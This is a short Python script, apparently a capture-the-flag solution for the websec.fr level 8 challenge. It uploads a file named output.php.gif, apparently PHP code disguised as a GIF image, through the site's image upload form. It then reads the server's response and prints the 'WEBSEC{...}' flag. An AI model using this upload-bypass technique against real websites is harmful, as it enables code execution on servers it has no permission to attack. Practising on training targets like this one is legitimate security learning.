from requests import *

url = 'http://websec.fr/level08/index.php'

with open('/root/output.php.gif', 'rb') as file_gif:
    files = {
        'fileToUpload': file_gif
    }
    data = {
        'submit': 'Upload Image'
    }
    
    r = post(url, data=data, files=files)
    pos = r.text.find('WEBSEC{')
    while (True):
        txt = r.text[pos]
        print(txt , end='')
        if (txt == '}'):
            print()
            break

        pos += 1
